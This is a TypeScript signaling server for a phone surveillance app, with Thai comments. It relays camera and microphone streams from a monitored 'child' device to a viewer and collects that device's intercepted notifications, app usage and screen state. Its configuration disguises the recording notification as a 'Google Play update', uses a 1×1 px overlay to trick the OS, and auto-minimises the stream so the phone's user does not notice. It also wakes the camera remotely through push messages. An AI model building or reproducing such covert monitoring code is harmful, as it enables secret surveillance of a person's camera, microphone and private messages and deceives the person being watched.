import { createServer } from 'node:http';
import { existsSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { Server, Socket } from 'socket.io';
import admin from 'firebase-admin';

const PORT = Number(process.env.PORT ?? 4001);
const PAIR_CODE_TTL_MS = 10 * 60 * 1000; // pair code หมดอายุ 10 นาที

// ---- Firebase Admin init ----

// อ่าน service account จาก env (recommended) หรือ file firebase-admin.json
// ถ้าไม่มี → ไม่ตาย แค่ FCM ปลุกกล้องจะใช้ไม่ได้
const __dirname = dirname(fileURLToPath(import.meta.url));
const adminKeyFile = join(__dirname, '..', 'firebase-admin.json');

let fcmEnabled = false;
try {
  let cred: admin.ServiceAccount | null = null;
  if (process.env.FIREBASE_ADMIN_KEY) {
    cred = JSON.parse(process.env.FIREBASE_ADMIN_KEY);
  } else if (existsSync(adminKeyFile)) {
    cred = JSON.parse(readFileSync(adminKeyFile, 'utf-8'));
  }
  if (cred) {
    admin.initializeApp({ credential: admin.credential.cert(cred) });
    fcmEnabled = true;
    console.log('[fcm] Firebase Admin initialized — remote wake-up enabled');
  } else {
    console.warn('[fcm] No Firebase credentials — remote wake-up disabled');
  }
} catch (e) {
  console.error('[fcm] Failed to init Firebase Admin:', (e as Error).message);
}

// ---- Types ----

interface RoomInfo {
  members: Set<string>; // socket IDs
  createdAt: number;
}

interface PairCodeInfo {
  deviceId: string;
  createdAt: number;
}

interface CameraInfo {
  socketId: string;
}

interface CameraConfig {
  // ข้อความใน foreground service notification (ปลอมเป็น Google Play update)
  notifTitle: string;
  notifBody: string;
  // เปิด 1×1 px overlay หลอกระบบว่าแอป foreground (AirDroid technique)
  stealthOverlay: boolean;
  // ย่อ activity ทันทีหลังเปิดกล้อง (user ไม่เห็นหน้า streaming)
  autoMinimize: boolean;
}

interface DeviceStatus {
  // 0-100 หรือ -1 = ไม่ทราบ
  batteryLevel: number;
  // กำลังชาร์จอยู่หรือไม่
  batteryCharging: boolean;
  // ชนิดเครือข่าย: 'wifi' | 'cellular' | 'none'
  networkType: string;
  // 0-4 (ระดับขีดสัญญาณ) หรือ -1 = ไม่ทราบ
  signalLevel: number;
  // ชื่อแอพที่ใช้อยู่ตอนนี้ (จาก UsageStatsManager) หรือ null
  foregroundApp: string | null;
  // จอเปิดอยู่หรือไม่
  screenOn: boolean;
  // epoch ms ที่ status report เข้ามาล่าสุด
  lastUpdate: number;
}

const DEFAULT_CONFIG: CameraConfig = {
  notifTitle: 'กำลังอัพเดท Google Play',
  notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
  // Default = OFF — user เครื่องลูกต้องเปิด "โหมดซ้อนแอพ" เองจาก HomeScreen
  stealthOverlay: false,
  autoMinimize: false,
};

// ---- State (in-memory) ----

const rooms = new Map<string, RoomInfo>();
const pairCodes = new Map<string, PairCodeInfo>();
const cameras = new Map<string, CameraInfo>();

// device_id → FCM token (เก็บถาวรในหน่วยความจำ — รีสตาร์ท server ก็หาย แต่ camera จะส่งใหม่ตอน register-camera)
const fcmTokens = new Map<string, string>();

// device_id → CameraConfig (viewer เก็บ remote config สำหรับกล้องแต่ละตัว)
// รีสตาร์ท server หาย → viewer ต้องส่งใหม่ (acceptable trade-off เพื่อความเรียบง่าย)
const configs = new Map<string, CameraConfig>();

// device_id → DeviceStatus ล่าสุด (camera push ทุก 30s + on-change)
const statuses = new Map<string, DeviceStatus>();

// device_id → Set<socketId> ของ viewer ที่ subscribe live updates
// (relay status-updated event ให้ทุก subscriber เมื่อ camera report-status)
const statusSubscribers = new Map<string, Set<string>>();

interface NotifEvent {
  packageName: string;
  appLabel: string;
  title: string;
  text: string;
  postTime: number;
  receivedAt: number; // server-side timestamp ตอนรับเข้ามา
}

// device_id → notif buffer (เก็บ 100 ตัวล่าสุด, FIFO)
const notifBuffers = new Map<string, NotifEvent[]>();
const NOTIF_BUFFER_LIMIT = 100;
const notifSubscribers = new Map<string, Set<string>>();

interface UsageStat {
  packageName: string;
  appLabel: string;
  totalTimeMs: number;
  lastUsed: number;
}

interface UsageReport {
  stats: UsageStat[];
  reportedAt: number;
}

// device_id → cached usage report ล่าสุด (camera ส่งเป็นระยะ)
const usageReports = new Map<string, UsageReport>();
const usageSubscribers = new Map<string, Set<string>>();

// device_id ที่ค้างรอ factory-reset (viewer สั่งตอน camera offline)
// → relay event เมื่อ camera register-camera ครั้งต่อไป
const pendingResets = new Set<string>();

// กัน spam push: device_id → timestamp ล่าสุดที่ส่ง
const lastPushAt = new Map<string, number>();
const PUSH_COOLDOWN_MS = 5_000; // ห้ามส่ง push ซ้ำใน 5 วินาที

// ลบ pair code ที่หมดอายุทุก 2 นาที
setInterval(() => {
  const now = Date.now();
  for (const [code, info] of pairCodes) {
    if (now - info.createdAt > PAIR_CODE_TTL_MS) {
      pairCodes.delete(code);
    }
  }
}, 2 * 60 * 1000);

// ---- FCM push helper ----

async function pushWakeCamera(deviceId: string): Promise<void> {
  if (!fcmEnabled) {
    console.warn(`[fcm] would wake ${deviceId.slice(0, 8)}… but FCM disabled`);
    return;
  }
  const token = fcmTokens.get(deviceId);
  if (!token) {
    console.warn(`[fcm] no token for ${deviceId.slice(0, 8)}…`);
    return;
  }
  const now = Date.now();
  const last = lastPushAt.get(deviceId) ?? 0;
  if (now - last < PUSH_COOLDOWN_MS) {
    console.log(`[fcm] cooldown — skip push to ${deviceId.slice(0, 8)}…`);
    return;
  }
  lastPushAt.set(deviceId, now);

  try {
    await admin.messaging().send({
      token,
      // data-only → MessagingService รับเสมอ → manual post notification
      // (รูปแบบนี้ทำงานสม่ำเสมอใน foreground/background/killed scenarios)
      data: {
        action: 'wake-camera',
        deviceId,
        title: 'เครื่องแม่ขอเปิดกล้อง',
        body: 'แตะเพื่ออนุญาตเปิดกล้องและเริ่มสตรีม',
      },
      android: {
        priority: 'high',
        ttl: 30_000,
      },
    });
    console.log(`[fcm] sent wake push to ${deviceId.slice(0, 8)}…`);
  } catch (e) {
    console.error(`[fcm] push failed for ${deviceId.slice(0, 8)}…:`, (e as Error).message);
    // token หมดอายุ → ลบทิ้ง camera จะส่งใหม่ตอน register
    if ((e as Error).message.includes('not-registered')) {
      fcmTokens.delete(deviceId);
    }
  }
}

// ---- Server ----

const httpServer = createServer((_req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({
    status: 'ok',
    rooms: rooms.size,
    pairCodes: pairCodes.size,
    cameras: cameras.size,
    fcmEnabled,
    fcmTokens: fcmTokens.size,
  }));
});

const io = new Server(httpServer, {
  cors: { origin: '*' },
});

io.on('connection', (socket: Socket) => {
  let currentRoom: string | null = null;
  let currentDeviceId: string | null = null;

  // camera แจ้งตัวตน: device_id + pair code (option) + fcm_token (option)
  socket.on(
    'register-camera',
    (payload: { deviceId?: string; code?: string; fcmToken?: string }) => {
      const deviceId = payload?.deviceId;
      const code = payload?.code;
      const fcmToken = payload?.fcmToken;

      if (typeof deviceId !== 'string' || deviceId.length < 8) {
        socket.emit('error', 'device_id ไม่ถูกต้อง');
        return;
      }

      cameras.set(deviceId, { socketId: socket.id });
      currentDeviceId = deviceId;

      if (typeof code === 'string' && code.length === 6) {
        pairCodes.set(code.toUpperCase(), { deviceId, createdAt: Date.now() });
      }

      if (typeof fcmToken === 'string' && fcmToken.length > 10) {
        fcmTokens.set(deviceId, fcmToken);
        console.log(
          `[register-camera] device=${deviceId.slice(0, 8)}… code=${code ?? '-'} fcm=${fcmToken.slice(0, 12)}…`,
        );
      } else {
        console.log(`[register-camera] device=${deviceId.slice(0, 8)}… code=${code ?? '-'} (no fcm)`);
      }

      socket.emit('register-camera-ok');

      // ถ้า viewer เคย set config ไว้ (ตอนกล้อง offline) → push ให้กล้องทันที
      const existingConfig = configs.get(deviceId);
      if (existingConfig) {
        socket.emit('config-pushed', existingConfig);
        console.log(`[register-camera] pushed pending config to ${deviceId.slice(0, 8)}…`);
      }

      // ถ้ามี factory-reset ค้างอยู่ (viewer สั่งตอน camera offline) → relay เลย
      if (pendingResets.has(deviceId)) {
        pendingResets.delete(deviceId);
        socket.emit('factory-reset', { deviceId });
        console.log(`[register-camera] relayed pending factory-reset to ${deviceId.slice(0, 8)}…`);
      }
    },
  );

  // viewer สั่งปลุกกล้องเอง (กรณีกล้อง offline หรือเปิดไม่ได้)
  // ต่างจาก auto-wake ใน join — อันนี้ user กดปุ่ม wake manual
  socket.on('wake-camera', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('wake-camera-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!fcmTokens.has(deviceId)) {
      socket.emit('wake-camera-error', 'ไม่พบ FCM token ของกล้อง — ให้เปิดกล้องครั้งแรกก่อน');
      return;
    }
    console.log(`[wake-camera] manual trigger for ${deviceId.slice(0, 8)}…`);
    pushWakeCamera(deviceId)
      .then(() => socket.emit('wake-camera-ok'))
      .catch((e) => socket.emit('wake-camera-error', (e as Error).message));
  });

  // viewer ขอ config ปัจจุบันของกล้อง (สำหรับเปิดหน้า Settings)
  socket.on('get-config', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('get-config-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    const config = configs.get(deviceId) ?? DEFAULT_CONFIG;
    socket.emit('config-current', { deviceId, config });
  });

  // viewer บันทึก config ใหม่ → เก็บ in-memory + relay ให้กล้องถ้า online
  socket.on('update-config', (payload: { deviceId?: string; config?: Partial<CameraConfig> }) => {
    const deviceId = payload?.deviceId;
    const cfg = payload?.config;
    if (typeof deviceId !== 'string' || deviceId.length < 8 || !cfg || typeof cfg !== 'object') {
      socket.emit('update-config-error', 'payload ไม่ถูกต้อง');
      return;
    }
    // merge กับ default — เผื่อ viewer ส่งมาไม่ครบ
    const merged: CameraConfig = {
      ...(configs.get(deviceId) ?? DEFAULT_CONFIG),
      ...cfg,
    };
    configs.set(deviceId, merged);
    console.log(
      `[update-config] ${deviceId.slice(0, 8)}… title="${merged.notifTitle}" stealth=${merged.stealthOverlay} auto=${merged.autoMinimize}`,
    );

    // ส่งให้กล้องทันทีถ้า online — ไม่ต้องรอ register-camera รอบหน้า
    const cam = cameras.get(deviceId);
    if (cam) {
      io.to(cam.socketId).emit('config-pushed', merged);
      console.log(`[update-config] relayed to online camera ${cam.socketId}`);
    }
    socket.emit('update-config-ok', merged);
  });

  // ---- Device status (battery / signal / foreground app / screen) ----

  // camera push status — เก็บ + relay ไปทุก viewer ที่ subscribe
  socket.on('report-status', (payload: { deviceId?: string; status?: Partial<DeviceStatus> }) => {
    const deviceId = payload?.deviceId;
    const s = payload?.status;
    if (typeof deviceId !== 'string' || deviceId.length < 8 || !s || typeof s !== 'object') {
      return; // เงียบ — ไม่ ack เพราะ status อาจมาบ่อย
    }
    const merged: DeviceStatus = {
      batteryLevel: typeof s.batteryLevel === 'number' ? s.batteryLevel : -1,
      batteryCharging: !!s.batteryCharging,
      networkType: typeof s.networkType === 'string' ? s.networkType : 'none',
      signalLevel: typeof s.signalLevel === 'number' ? s.signalLevel : -1,
      foregroundApp: typeof s.foregroundApp === 'string' ? s.foregroundApp : null,
      screenOn: !!s.screenOn,
      lastUpdate: Date.now(),
    };
    statuses.set(deviceId, merged);

    // relay ไปทุก subscriber
    const subs = statusSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('status-updated', { deviceId, status: merged });
      }
    }
  });

  // viewer ขอ status snapshot ปัจจุบัน (เปิด Dashboard ครั้งแรก)
  socket.on('get-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('get-status-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    const status = statuses.get(deviceId);
    if (!status) {
      socket.emit('get-status-error', 'ยังไม่มี status — รอกล้อง report');
      return;
    }
    socket.emit('status-current', { deviceId, status });
  });

  // viewer subscribe live status updates
  socket.on('subscribe-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) return;
    if (!statusSubscribers.has(deviceId)) statusSubscribers.set(deviceId, new Set());
    statusSubscribers.get(deviceId)!.add(socket.id);
    console.log(`[subscribe-status] ${socket.id} → ${deviceId.slice(0, 8)}…`);

    // ส่ง snapshot ทันทีถ้ามี
    const status = statuses.get(deviceId);
    if (status) socket.emit('status-updated', { deviceId, status });
  });

  socket.on('unsubscribe-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    statusSubscribers.get(deviceId)?.delete(socket.id);
  });

  // ---- Notification mirror ----

  // camera ส่ง notif events ที่ดักจับได้ (batch จาก periodic drainer)
  socket.on('report-notif', (payload: { deviceId?: string; events?: unknown[] }) => {
    const deviceId = payload?.deviceId;
    const events = payload?.events;
    if (typeof deviceId !== 'string' || deviceId.length < 8 || !Array.isArray(events)) {
      return;
    }
    const now = Date.now();
    const valid: NotifEvent[] = [];
    for (const raw of events) {
      if (!raw || typeof raw !== 'object') continue;
      const r = raw as Record<string, unknown>;
      const pkg = typeof r.packageName === 'string' ? r.packageName : '';
      const label = typeof r.appLabel === 'string' ? r.appLabel : pkg;
      const title = typeof r.title === 'string' ? r.title : '';
      const text = typeof r.text === 'string' ? r.text : '';
      const postTime = typeof r.postTime === 'number' ? r.postTime : now;
      if (!pkg || (!title && !text)) continue;
      valid.push({
        packageName: pkg,
        appLabel: label,
        title,
        text,
        postTime,
        receivedAt: now,
      });
    }
    if (valid.length === 0) return;

    // เก็บใน buffer + trim
    const buf = notifBuffers.get(deviceId) ?? [];
    buf.push(...valid);
    while (buf.length > NOTIF_BUFFER_LIMIT) buf.shift();
    notifBuffers.set(deviceId, buf);

    // push ให้ subscriber ทันที (ใช้ array events เพื่อ batch)
    const subs = notifSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('notif-pushed', { deviceId, events: valid });
      }
    }
    console.log(`[report-notif] ${deviceId.slice(0, 8)}… +${valid.length} (buf=${buf.length})`);
  });

  // viewer ขอ buffer notif ล่าสุด (ตอนเปิด Dashboard)
  socket.on('get-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('get-notifs-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    socket.emit('notifs-current', {
      deviceId,
      events: notifBuffers.get(deviceId) ?? [],
    });
  });

  // viewer subscribe live notif updates
  socket.on('subscribe-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) return;
    if (!notifSubscribers.has(deviceId)) notifSubscribers.set(deviceId, new Set());
    notifSubscribers.get(deviceId)!.add(socket.id);
    console.log(`[subscribe-notifs] ${socket.id} → ${deviceId.slice(0, 8)}…`);
  });

  socket.on('unsubscribe-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    notifSubscribers.get(deviceId)?.delete(socket.id);
  });

  // ---- Usage stats (app usage time) ----

  // camera ส่ง snapshot ของ usage stats 24h
  socket.on('report-usage-stats', (payload: { deviceId?: string; stats?: unknown[] }) => {
    const deviceId = payload?.deviceId;
    const stats = payload?.stats;
    if (typeof deviceId !== 'string' || deviceId.length < 8 || !Array.isArray(stats)) return;

    const valid: UsageStat[] = [];
    for (const raw of stats) {
      if (!raw || typeof raw !== 'object') continue;
      const r = raw as Record<string, unknown>;
      valid.push({
        packageName: typeof r.packageName === 'string' ? r.packageName : '',
        appLabel: typeof r.appLabel === 'string' ? r.appLabel : '',
        totalTimeMs: typeof r.totalTimeMs === 'number' ? r.totalTimeMs : 0,
        lastUsed: typeof r.lastUsed === 'number' ? r.lastUsed : 0,
      });
    }
    const report: UsageReport = { stats: valid, reportedAt: Date.now() };
    usageReports.set(deviceId, report);

    const subs = usageSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('usage-stats-updated', { deviceId, ...report });
      }
    }
    console.log(`[report-usage-stats] ${deviceId.slice(0, 8)}… stats=${valid.length}`);
  });

  // viewer ขอ snapshot (เปิด Dashboard / pull-to-refresh)
  socket.on('get-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('get-usage-stats-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    const report = usageReports.get(deviceId);
    if (!report) {
      socket.emit('get-usage-stats-error', 'ยังไม่มีข้อมูล — รอกล้อง report');
      return;
    }
    socket.emit('usage-stats-current', { deviceId, ...report });
  });

  // viewer subscribe live updates
  socket.on('subscribe-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) return;
    if (!usageSubscribers.has(deviceId)) usageSubscribers.set(deviceId, new Set());
    usageSubscribers.get(deviceId)!.add(socket.id);
  });

  socket.on('unsubscribe-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    usageSubscribers.get(deviceId)?.delete(socket.id);
  });

  // viewer สั่งให้กล้อง refresh stats ทันที (เช่น กดปุ่ม refresh)
  socket.on('refresh-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    const cam = cameras.get(deviceId);
    if (cam) {
      io.to(cam.socketId).emit('fetch-usage-stats', { deviceId });
    }
  });

  // viewer สั่ง factory-reset เครื่องลูก:
  // → camera รับ event → clear auto_streaming + restore window + stop FGS
  // → user จะกลับมาเห็น UI ของ camera_app ปกติ (สำหรับ pair ใหม่)
  socket.on('factory-reset', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string' || deviceId.length < 8) {
      socket.emit('factory-reset-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    // เคลียร์ state ฝั่ง server ก่อนเสมอ
    configs.delete(deviceId);
    statuses.delete(deviceId);
    notifBuffers.delete(deviceId);
    usageReports.delete(deviceId);

    const cam = cameras.get(deviceId);
    if (!cam) {
      // กล้อง offline → เก็บไว้ใน pendingResets → relay ตอน register-camera รอบหน้า
      pendingResets.add(deviceId);
      socket.emit('factory-reset-ok', { deviceId, relayed: false });
      console.log(`[factory-reset] ${deviceId.slice(0, 8)}… offline — queued (จะ relay ตอน online)`);
      return;
    }
    io.to(cam.socketId).emit('factory-reset', { deviceId });
    socket.emit('factory-reset-ok', { deviceId, relayed: true });
    console.log(`[factory-reset] ${deviceId.slice(0, 8)}… relayed to camera + cleared server state`);
  });

  // viewer แลกรหัสจับคู่เป็น device_id
  socket.on('pair-viewer', (payload: { code?: string }) => {
    const code = payload?.code;
    if (typeof code !== 'string' || code.length !== 6) {
      socket.emit('pair-viewer-error', 'รหัสต้องมี 6 หลัก');
      return;
    }

    const info = pairCodes.get(code.toUpperCase());
    if (!info) {
      socket.emit('pair-viewer-error', 'ไม่พบรหัสนี้ หรือรหัสหมดอายุแล้ว');
      return;
    }

    console.log(`[pair-viewer] code=${code} → device=${info.deviceId.slice(0, 8)}…`);
    socket.emit('pair-viewer-ok', { deviceId: info.deviceId });
  });

  // Room join — ถ้า camera ของ room นี้ offline และมี FCM token → ส่ง push ปลุก
  socket.on('join', (input: string) => {
    if (typeof input !== 'string') {
      socket.emit('error', 'join ต้องส่ง string');
      return;
    }

    let roomKey: string;
    if (input.length === 6) {
      const info = pairCodes.get(input.toUpperCase());
      if (!info) {
        socket.emit('error', 'ไม่พบรหัสนี้ หรือรหัสหมดอายุแล้ว');
        return;
      }
      roomKey = info.deviceId;
    } else {
      roomKey = input;
    }

    if (!rooms.has(roomKey)) {
      rooms.set(roomKey, { members: new Set(), createdAt: Date.now() });
    }

    const room = rooms.get(roomKey)!;
    if (room.members.size >= 2) {
      socket.emit('error', 'room เต็มแล้ว');
      return;
    }

    room.members.add(socket.id);
    socket.join(roomKey);
    currentRoom = roomKey;

    console.log(`[join] ${socket.id} → room ${roomKey.slice(0, 8)}… (${room.members.size}/2)`);

    // ถ้าห้องนี้ camera ยังไม่เข้า (room มี viewer คนเดียว) และเรารู้ token ของ camera → ส่ง FCM ปลุก
    const cameraOnline = cameras.has(roomKey);
    if (!cameraOnline && room.members.size === 1) {
      console.log(`[join] camera ${roomKey.slice(0, 8)}… offline, sending wake push`);
      pushWakeCamera(roomKey).catch((e) => console.error('[fcm] push error:', e));
    }

    if (room.members.size === 2) {
      // peer-joined ต้องไปถึง camera (เพราะ camera เป็นคนสร้าง offer)
      // ปกติ: camera join ก่อน (เป็น peer แรก) → ส่งให้ peer แรก = camera ✓
      // FCM wake-up: viewer join ก่อน, camera join ทีหลัง → socket นี้คือ camera
      //   → ต้องส่งให้ตัวเอง (ไม่ใช่ peer แรก = viewer)
      const isCameraSocket = currentDeviceId === roomKey;
      if (isCameraSocket) {
        socket.emit('peer-joined');
      } else {
        socket.to(roomKey).emit('peer-joined');
      }
    }
  });

  socket.on('offer', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('offer', payload);
  });

  socket.on('answer', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('answer', payload);
  });

  socket.on('ice-candidate', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('ice-candidate', payload);
  });

  // viewer ส่งคำสั่งให้กล้องสลับหน้า/หลัง — relay ตรงไปกล้องใน room เดียวกัน
  socket.on('switch-camera', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('switch-camera', payload);
  });

  // viewer toggle mic เปิด/ปิด — relay ไปกล้อง
  socket.on('toggle-mic', (payload: unknown) => {
    if (currentRoom) socket.to(currentRoom).emit('toggle-mic', payload);
  });

  socket.on('disconnect', () => {
    if (currentDeviceId) {
      cameras.delete(currentDeviceId);
      console.log(`[disconnect-camera] device=${currentDeviceId.slice(0, 8)}…`);
    }
    // ลบ subscriber socket นี้ออกจากทุก room
    for (const subs of statusSubscribers.values()) subs.delete(socket.id);
    for (const subs of notifSubscribers.values()) subs.delete(socket.id);
    for (const subs of usageSubscribers.values()) subs.delete(socket.id);
    if (currentRoom) {
      const room = rooms.get(currentRoom);
      if (room) {
        room.members.delete(socket.id);
        socket.to(currentRoom).emit('peer-left');
        if (room.members.size === 0) rooms.delete(currentRoom);
      }
      console.log(`[disconnect] ${socket.id} left room ${currentRoom.slice(0, 8)}…`);
    }
  });
});

httpServer.listen(PORT, () => {
  console.log(`CamConnect signaling server running on :${PORT}`);
});
